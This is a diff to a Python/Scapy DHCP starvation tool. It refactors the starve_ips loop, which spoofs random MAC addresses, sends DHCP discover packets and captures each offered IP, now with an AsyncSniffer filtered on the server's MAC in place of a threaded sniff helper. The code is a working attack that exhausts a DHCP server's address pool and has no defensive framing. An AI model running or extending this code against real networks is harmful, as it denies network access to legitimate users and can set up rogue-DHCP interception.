@@ -156,31 +156,6 @@ def is_my_dhcp_offer(packet, my_mac : str)->bool:
         return False
     
     return my_mac in packet[BOOTP].chaddr
-        
-
-def capture_my_dhcp_offer(dest_mac : str, interface : str = conf.iface , result_list = None):
-    """
-    Gets a MAC and server IP
-    tries to Capture DHCP responses for the provided MAC
-    return value of this function doesn't matter as it is intented to provide the result via result_list
-    """
-    
-
-    logger.info(f"sniffing on interface {interface} for dhcp offers for {dest_mac}")
-    res = sniff(count=1, filter = f"udp and src port {DHCP_ATTS.SERVER_PORT} and dst port {DHCP_ATTS.CLIENT_PORT}", timeout=4, iface=interface)
-
-    if len(res) != 0:
-        result_list[0] = res[0]
-        result_list.append(res[0][Ether].src)
-        logger.debug(f"function_name : captured offer for {dest_mac} from {result_list[1]}")
-    
-    if len(res) != 0 : logger.info(f"captured {res}")
-    else : logger.warning(f"returning None")
-    
-
-
-    return None
-    
 
 def is_dhcp_ack(packet)->bool:
     
@@ -299,27 +274,33 @@ def starve_ips( server_ip : str,server_mac : str ,interface : str = conf.iface ,
         temp_mac = str(RandMAC(mac_template))
         template_udp_packet[Ether].src = temp_mac
 
-        offer = [None]
-        
-        sniff_thread = threading.Thread(target=capture_my_dhcp_offer, args=[temp_mac , interface, offer])
+        sniff_thread = AsyncSniffer(
+                filter = f"udp and src port {DHCP_ATTS.SERVER_PORT} and dst port {DHCP_ATTS.CLIENT_PORT} and ether src host {server_mac}",
+                iface= interface,
+                count = 1,
+                timeout = 4
+                )
         sniff_thread.start()
+        while not hasattr(sniff_thread, 'stop_cb'):
+            time.sleep(0.06)
         
-        time.sleep(0.2)
         sendp(
                 template_udp_packet / dhcp_discover(temp_mac), 
                 interface)
         
         sniff_thread.join()
+        sniffed_offer= sniff_thread.results
         
-        if(offer[0] is None):
-            logger.warning('no offer captured')
+        if sniffed_offer is None \
+                or len(sniffed_offer) == 0:
+            logger.warning(f'no offer captured, {sniffed_offer=}')
             time_to_wait += 1
             try:
                 keep_alive_thread.join()
             except:1
             continue
         
-        offered_ip = offer[0][BOOTP].yiaddr
+        offered_ip = sniffed_offer[0][BOOTP].yiaddr
         
         logger.info(offered_ip + ',' + temp_mac)
         
